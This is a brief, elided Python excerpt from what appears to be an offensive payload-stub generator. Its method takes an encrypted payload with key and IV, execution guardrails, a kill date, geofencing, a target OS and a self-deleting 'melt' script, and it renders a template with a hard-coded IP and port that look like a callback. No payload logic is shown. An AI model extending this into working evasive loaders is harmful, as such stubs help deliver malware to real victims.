...
class Generator:
    ...
    def generate_stub(self, language, ciphertext, key, iv, guardrail=None, kill_date=None, geofence=None, target_os=None, melt_script=None, **kwargs):
        """
        ...
        return template.render(ciphertext=ciphertext, key=key, iv=iv, guardrail=guardrail, kill_date=kill_date, geofence=geofence, ip="1.1.1.1", port=1337, melt_script=melt_script, **kwargs)
